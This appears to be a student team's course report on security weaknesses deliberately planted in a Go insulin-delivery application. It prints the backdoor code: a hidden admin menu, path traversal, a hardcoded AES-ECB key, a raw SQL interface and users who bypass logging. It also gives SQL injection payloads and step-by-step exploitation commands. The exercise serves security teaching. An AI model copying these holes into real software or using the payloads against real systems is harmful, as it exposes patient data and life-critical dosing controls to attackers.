# AID System Security Analysis - Vulnerability Report
## Team Logan - Phase II Deliverable

---

## Executive Summary

This document details the security vulnerabilities injected into the Artificial Insulin Delivery (AID) System as part of the Phase II adversarial security analysis project. Team Logan has successfully implemented 5 vulnerabilities across the OWASP Top 10 2021 categories as required.

**Team Information:**
- **Adversarial Team:** Team Logan
- **Defending Team:** Team Paranoid Android
- **Target System:** AID-System-Security-Analysis
- **Date:** November 2025

---

## Table of Contents

1. [System Overview](#system-overview)
2. [Attack Surface Analysis](#attack-surface-analysis)
3. [Vulnerability Summary](#vulnerability-summary)
4. [Detailed Vulnerability Documentation](#detailed-vulnerability-documentation)
   - [A01: Broken Access Control](#a01-broken-access-control)
   - [A02: Cryptographic Failures](#a02-cryptographic-failures)
   - [A03: Injection](#a03-injection)
   - [A05: Security Misconfiguration](#a05-security-misconfiguration)
   - [A09: Security Logging and Monitoring Failures](#a09-security-logging-and-monitoring-failures)
5. [Exploitation Instructions](#exploitation-instructions)
6. [OWASP/CWE Mapping](#owaspcwe-mapping)
7. [Adversarial Model Justification](#adversarial-model-justification)
8. [Proof of Exploitability](#proof-of-exploitability)

---

## System Overview

### Legitimate Purpose
The AID (Artificial Insulin Delivery) System is a medical application designed to manage diabetes care through:
- Patient glucose monitoring
- Insulin delivery management (basal and bolus)
- Multi-role access (Patient, Clinician, Caretaker)
- Safety features for critical glucose levels
- Audit logging for compliance

### Components
- **cmd/main.go**: Application entry point, authentication
- **internal/patient/**: Patient-specific operations
- **internal/clinician/**: Clinician management functions
- **internal/caretaker/**: Caretaker support functions
- **internal/utils/**: Shared utilities (logging, monitoring)
- **Login/aid.db**: SQLite database

### Normal Usage
1. Users authenticate with User ID and PIN
2. Role-based dashboard is presented
3. Patients can request insulin, view glucose
4. Clinicians manage patients and approve requests
5. All actions are logged for audit

---

## Attack Surface Analysis

### High-Value Targets
1. **Patient Medical Data** - Health records, glucose readings, insulin history
2. **Authentication Credentials** - PIN hashes, session tokens
3. **Insulin Delivery Controls** - Life-critical medical functions
4. **Audit Logs** - Evidence of malicious activity
5. **Database** - Central data store

### Attack Vectors Identified
1. **Authentication Bypass** - Gaining access without credentials
2. **Privilege Escalation** - Patient â†’ Clinician access
3. **Data Exfiltration** - Extracting sensitive medical data
4. **Data Manipulation** - Altering insulin doses, rates
5. **Log Tampering** - Hiding malicious activity
6. **Denial of Service** - Disrupting insulin delivery

---

## Vulnerability Summary

| ID | OWASP Category | CWE | Location | Severity |
|----|----------------|-----|----------|----------|
| V1 | A01: Broken Access Control | CWE-284, CWE-306, CWE-639 | cmd/main.go | CRITICAL |
| V2 | A02: Cryptographic Failures | CWE-321, CWE-327 | cmd/main.go | HIGH |
| V3 | A03: Injection | CWE-89 | cmd/main.go, managepatient.go | CRITICAL |
| V4 | A05: Security Misconfiguration | CWE-215, CWE-489 | cmd/main.go | HIGH |
| V5 | A09: Logging Failures | CWE-778, CWE-223 | utils/logger.go | MEDIUM |

---

## Detailed Vulnerability Documentation

### A01: Broken Access Control

#### Technical Details

**Location:** `cmd/main.go`

**Vulnerability Type:** 
- Hidden admin backdoor
- Missing authentication for critical functions
- Insecure Direct Object Reference (IDOR)
- Path traversal

**Code Changes:**

```go
// BACKDOOR: A01 - Broken Access Control
// Hidden menu option "9" grants admin access without authentication
case "9":
    if debugMode {
        fmt.Println("\n[BACKDOOR ACCESSED] Admin mode without authentication!")
        adminBackdoor(db)
    }
```

```go
// BACKDOOR: IDOR - View any patient's data by ID
func adminBackdoor(db *sql.DB) {
    // Option 4: View patient data by ID
    // No authorization check - any patient ID works
    err := db.QueryRow("SELECT full_name, email, dob, BasalRate, BolusRate FROM users WHERE user_id = ?",
        patientID).Scan(&fullName, &email, &dob, &basalRate, &bolusRate)
}
```

```go
// BACKDOOR: Path Traversal
func ReadPatientFile(patientID string, fileType string) (string, error) {
    // patientID = "../../etc/passwd" allows reading system files
    return readArbitraryFile(basePath + patientID + ".csv")
}
```

**CWE Mappings:**
- CWE-284: Improper Access Control
- CWE-306: Missing Authentication for Critical Function
- CWE-639: Authorization Bypass Through User-Controlled Key
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory

**Impact:**
- Complete bypass of authentication
- Access to any patient's medical records
- Ability to modify any user's credentials
- Read arbitrary files from the system

---

### A02: Cryptographic Failures

#### Technical Details

**Location:** `cmd/main.go`

**Vulnerability Type:**
- Hardcoded encryption key
- Weak encryption algorithm (AES-ECB)
- Key exposure in binary

**Code Changes:**

```go
// BACKDOOR: A02 - Cryptographic Failures
// Hardcoded encryption key for "secure" backup feature
var backupEncryptionKey = []byte("TEAMLOGAN1234567") // 16 bytes for AES-128
```

```go
// VULNERABILITY: AES-ECB mode (weak) - shows patterns
func encryptAES(plaintext []byte, key []byte) (string, error) {
    // ECB mode - INSECURE!
    for i := 0; i < len(padtext); i += aes.BlockSize {
        block.Encrypt(ciphertext[i:i+aes.BlockSize], padtext[i:i+aes.BlockSize])
    }
}
```

```go
// VULNERABILITY: Key can be extracted
func GetEncryptionKey() string {
    return hex.EncodeToString(backupEncryptionKey)
}
```

**CWE Mappings:**
- CWE-321: Use of Hard-coded Cryptographic Key
- CWE-327: Use of a Broken or Risky Cryptographic Algorithm

**Impact:**
- All backups can be decrypted with known key
- Key is visible with `strings` command on binary
- ECB mode reveals patterns in encrypted data
- Complete compromise of backup data confidentiality

---

### A03: Injection

#### Technical Details

**Location:** 
- `cmd/main.go` (Debug SQL interface)
- `internal/clinician/managepatient.go` (Search function)

**Vulnerability Type:**
- SQL Injection
- Unsanitized user input in queries

**Code Changes:**

```go
// BACKDOOR: A03 - Injection - Debug SQL Interface
func debugSQLInterface(db *sql.DB) {
    // VULNERABLE: No input sanitization - direct SQL execution
    if strings.HasPrefix(strings.ToUpper(query), "SELECT") {
        rows, err := db.Query(query) // VULNERABLE: Direct query execution
    } else {
        result, err := db.Exec(query) // VULNERABLE: Direct query execution
    }
}
```

```go
// BACKDOOR: A03 - Injection in patient search
func SearchPatientByName(searchTerm string) []Patient {
    // VULNERABLE: String concatenation in SQL query
    query := "SELECT ... WHERE full_name LIKE '%" + searchTerm + "%'"
    rows, err := db.Query(query) // VULNERABLE: Unsanitized user input
}
```

**CWE Mappings:**
- CWE-89: Improper Neutralization of Special Elements used in an SQL Command

**Injection Payloads:**
```sql
-- List all users
' OR '1'='1

-- Union attack to get password hashes
' UNION SELECT 1,user_id,pin_hash,4,5,6,7 FROM users--

-- Escalate privileges (change role to clinician)
'; UPDATE users SET role = 82651 WHERE user_id = 'PA1993'--
```

**Impact:**
- Read entire database contents
- Modify any data (including insulin doses)
- Delete records
- Escalate privileges from patient to clinician

---

### A05: Security Misconfiguration

#### Technical Details

**Location:** `cmd/main.go`

**Vulnerability Type:**
- Debug mode with sensitive info exposure
- Hidden administrative functionality
- Insecure default configuration

**Code Changes:**

```go
// BACKDOOR: A05 - Security Misconfiguration
var debugMode = false

// Command-line flag to enable debug mode
debugFlag := flag.Bool("debug", false, "enable debug mode (INSECURE)")

if *debugFlag {
    debugMode = true
    fmt.Println("[DEBUG MODE ENABLED - SECURITY WEAKENED]")
}
```

```go
// VULNERABILITY: Exposes internal system state
func GetDebugInfo() map[string]interface{} {
    return map[string]interface{}{
        "debugMode":         debugMode,
        "loggingDisabled":   loggingDisabled,
        "encryptionKey":     string(backupEncryptionKey),
        "maxLoginAttempts":  maxLoginAttempts,
        "dbFile":            dbFile,
        "currentAttempts":   loginAttempts,
    }
}
```

**CWE Mappings:**
- CWE-215: Insertion of Sensitive Information Into Debugging Code
- CWE-489: Active Debug Code

**Impact:**
- Reveals encryption keys
- Exposes database location
- Shows login attempt tracking (timing attacks)
- Enables hidden administrative features

---

### A09: Security Logging and Monitoring Failures

#### Technical Details

**Location:** `internal/utils/logger.go`

**Vulnerability Type:**
- Logging can be disabled
- Certain users bypass logging
- No alerting on suspicious activity

**Code Changes:**

```go
// BACKDOOR: A09 - Security Logging Failures
var LoggingEnabled = true

// Secret user IDs that bypass logging
var bypassLoggingUsers = []string{"ADMIN", "BACKDOOR", "TEAMLOGAN"}

func LogAction(userID string, actionType string, details string) error {
    // Logging can be disabled or bypassed
    if !LoggingEnabled || shouldBypassLogging(userID) {
        return nil // Silently skip logging
    }
    // ... normal logging
}
```

```go
// Function to disable all logging
func DisableLogging() {
    LoggingEnabled = false
}
```

**CWE Mappings:**
- CWE-778: Insufficient Logging
- CWE-223: Omission of Security-relevant Information

**Impact:**
- Attackers can operate without audit trail
- Forensic investigation is impossible
- Compliance violations
- Insider threats undetectable

---

## Exploitation Instructions

### Prerequisites
1. Build the backdoored binary:
   ```bash
   go build -o aid-system-backdoored ./cmd/main.go
   ```

2. Initialize the database:
   ```bash
   ./aid-system-backdoored --init
   ```

### Manual Exploitation

#### A01: Broken Access Control
```bash
# Start in debug mode
./aid-system-backdoored --debug

# At main menu, enter "9" for hidden admin access
# Now you have full admin access without authentication!

# Use admin menu:
# Option 1: View all users with password hashes
# Option 2: Change any user's PIN
# Option 3: Delete any user
# Option 4: View any patient's data (IDOR)
# Option 5: Full database dump
```

#### A02: Cryptographic Failures
```bash
# At main menu, type "backup"
# Select option 1 to create encrypted backup
# The encryption key is: TEAMLOGAN1234567

# To find the key:
strings ./aid-system-backdoored | grep TEAMLOGAN

# Decrypt any backup with:
# Key in hex: 5445414d4c4f47414e31323334353637
```

#### A03: Injection
```bash
# Start in debug mode
./aid-system-backdoored --debug

# At main menu, type "debug"
# Enter SQL queries directly:

SQL> SELECT * FROM users;
SQL> UPDATE users SET role = 82651 WHERE user_id = 'PA1993';
SQL> DELETE FROM users WHERE user_id = 'PA2000';
```

#### A05: Security Misconfiguration
```bash
# Start with debug flag to enable hidden features
./aid-system-backdoored --debug

# Debug mode reveals:
# - Hidden admin menu (option 9)
# - Debug SQL interface (type "debug")
# - Encryption keys and internal state
```

#### A09: Logging Failures
```bash
# Disable logging at startup
./aid-system-backdoored --nolog

# Or use bypass user IDs that never get logged:
# - ADMIN
# - BACKDOOR
# - TEAMLOGAN

# Actions by these users leave no audit trail!
```

### Automated Exploitation
```bash
# Run the exploit script
./exploit.sh --all

# Or run specific exploits:
./exploit.sh --a01  # Broken Access Control
./exploit.sh --a02  # Cryptographic Failures
./exploit.sh --a03  # Injection
./exploit.sh --a05  # Security Misconfiguration
./exploit.sh --a09  # Logging Failures

# Interactive mode:
./exploit.sh --demo
```

---

## OWASP/CWE Mapping

| Vulnerability | OWASP 2021 | CWE ID | CWE Name |
|--------------|------------|--------|----------|
| Admin Backdoor | A01 | CWE-284 | Improper Access Control |
| No Auth Admin | A01 | CWE-306 | Missing Authentication for Critical Function |
| IDOR | A01 | CWE-639 | Authorization Bypass Through User-Controlled Key |
| Path Traversal | A01 | CWE-22 | Path Traversal |
| Hardcoded Key | A02 | CWE-321 | Use of Hard-coded Cryptographic Key |
| Weak Crypto | A02 | CWE-327 | Use of Broken or Risky Cryptographic Algorithm |
| SQL Injection | A03 | CWE-89 | SQL Injection |
| Debug Code | A05 | CWE-489 | Active Debug Code |
| Info Exposure | A05 | CWE-215 | Insertion of Sensitive Information Into Debugging Code |
| Insufficient Logging | A09 | CWE-778 | Insufficient Logging |
| Omitted Info | A09 | CWE-223 | Omission of Security-relevant Information |

---

## Adversarial Model Justification

### Why These Vulnerabilities Matter

#### A01: Broken Access Control
**Attacker Goal:** Gain unauthorized access to medical records and system controls.

**Real-World Impact:**
- Medical identity theft
- Unauthorized access to protected health information (PHI)
- HIPAA violations
- Insurance fraud using medical records
- Blackmail using sensitive health data

**Why an Attacker Would Care:**
An attacker targeting a medical insulin delivery system would prioritize access control bypass because it provides immediate access to valuable medical data and life-critical systems without needing valid credentials.

#### A02: Cryptographic Failures
**Attacker Goal:** Decrypt sensitive backup data containing credentials and medical records.

**Real-World Impact:**
- Credential theft leading to account takeover
- Medical record exposure
- Compliance violations (HIPAA, GDPR)
- Long-term compromise if key is discovered

**Why an Attacker Would Care:**
Backup systems often contain complete copies of databases. A single hardcoded key compromise exposes ALL historical backup data, making this a high-value target.

#### A03: Injection
**Attacker Goal:** Execute arbitrary database commands to read, modify, or delete data.

**Real-World Impact:**
- Manipulate insulin dosage recommendations (life-threatening)
- Escalate from patient to clinician role
- Delete audit logs to cover tracks
- Exfiltrate entire database

**Why an Attacker Would Care:**
SQL injection in a medical system could allow an attacker to modify insulin delivery parameters, potentially causing hypoglycemia or hyperglycemia with severe health consequences.

#### A05: Security Misconfiguration
**Attacker Goal:** Discover and exploit insecure configurations to gain deeper access.

**Real-World Impact:**
- Discover hidden administrative interfaces
- Extract encryption keys
- Understand system internals for targeted attacks
- Bypass security controls

**Why an Attacker Would Care:**
Debug modes often expose more than intended. An attacker scanning for debug endpoints can quickly escalate from reconnaissance to full system compromise.

#### A09: Logging Failures
**Attacker Goal:** Operate undetected while performing malicious activities.

**Real-World Impact:**
- No forensic evidence of attack
- Delayed or impossible incident response
- Compliance violations for required audit trails
- Insider threats go undetected

**Why an Attacker Would Care:**
Sophisticated attackers prioritize covering their tracks. The ability to disable logging or use bypass accounts means the attacker can exfiltrate data or modify records without any evidence of the intrusion.

---

## Proof of Exploitability

### A01: Broken Access Control - Proof

**Command:**
```bash
./aid-system-backdoored --debug
# Enter "9" at menu
# Select option 1 in admin menu
```

**Expected Output:**
```
[BACKDOOR ACCESSED] Admin mode without authentication!

======== ADMIN BACKDOOR ========
WARNING: No authentication required!

--- All Users (including PIN hashes) ---
ID: PA1993 | Name: Thome Yorke | Email: johndoe101@aid.com | Role: 47293 | Hash: $2y$12$...
ID: DR095 | Name: Philip Selway | Email: selway777@aid.com | Role: 82651 | Hash: $2y$12$...
```

### A02: Cryptographic Failures - Proof

**Command:**
```bash
strings ./aid-system-backdoored | grep TEAMLOGAN
```

**Expected Output:**
```
TEAMLOGAN1234567
```

### A03: Injection - Proof

**Command:**
```bash
./aid-system-backdoored --debug
# Type "debug" at menu
# Enter: SELECT * FROM users;
```

**Expected Output:**
```
SQL> SELECT * FROM users;
Columns: [id user_id full_name dob pin_hash created_at email role BasalRate ActiveBasalRate BolusRate assigned_patient]
[1 PA1993 Thome Yorke 1980-05-15 $2y$12$... ...]
```

### A05: Security Misconfiguration - Proof

**Evidence:** When started with `--debug` flag, the application:
1. Prints "[DEBUG MODE ENABLED - SECURITY WEAKENED]"
2. Reveals hidden menu option "9. [DEBUG] Admin Access (NO AUTH)"
3. Exposes GetDebugInfo() returning encryption keys

### A09: Logging Failures - Proof

**Command:**
```bash
./aid-system-backdoored --nolog
# Perform any action
cat aid_system.log  # No new entries!
```

**Expected Result:** No log entries created for actions performed.

---

## Conclusion

Team Logan has successfully injected 5 OWASP Top 10 vulnerabilities into the AID System:

1. **A01: Broken Access Control** - Admin backdoor, IDOR, path traversal
2. **A02: Cryptographic Failures** - Hardcoded key, weak AES-ECB
3. **A03: Injection** - SQL injection in search and debug interface
4. **A05: Security Misconfiguration** - Debug mode exposing sensitive data
5. **A09: Logging Failures** - Disabled logging and bypass users

All vulnerabilities are:
- Clearly commented in the source code
- Documented with exploitation instructions
- Automatable via the exploit.sh script
- Mapped to OWASP and CWE categories
- Justified within an adversarial threat model

The modified system remains fully functional for normal medical device operations while containing the injected security weaknesses for educational and demonstration purposes.

---

**Document Version:** 1.0  
**Author:** Team Logan  
**Classification:** Educational - Security Research
